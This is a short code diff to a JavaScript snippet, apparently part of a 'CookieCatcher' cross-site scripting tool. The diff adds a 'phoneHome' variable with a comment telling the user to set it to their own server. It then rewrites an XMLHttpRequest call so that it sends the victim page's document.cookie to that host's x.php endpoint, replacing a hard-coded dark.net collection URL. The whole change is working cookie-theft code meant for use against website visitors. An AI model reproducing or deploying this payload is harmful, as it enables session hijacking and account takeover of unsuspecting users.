@@ -1,3 +1,6 @@
+/** CHANGE THIS VALUE TO YOUR SERVER **/
+var phoneHome = "http://cookiecatcher.net/"; // leave trailing slash
+
 function loadXMLDoc()
 {
   var xmlhttp;
@@ -11,9 +14,8 @@ function loadXMLDoc()
       document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
     }
   }
-  xmlhttp.open("GET","http://dark.net/CookieCatcher/x.php?c="+cookie,true);
+  xmlhttp.open("GET",phoneHome+"x.php?c="+document.cookie,true);
   xmlhttp.send();
 }
 
-var cookie = document.cookie;
-loadXMLDoc(cookie);
+loadXMLDoc(phoneHome);
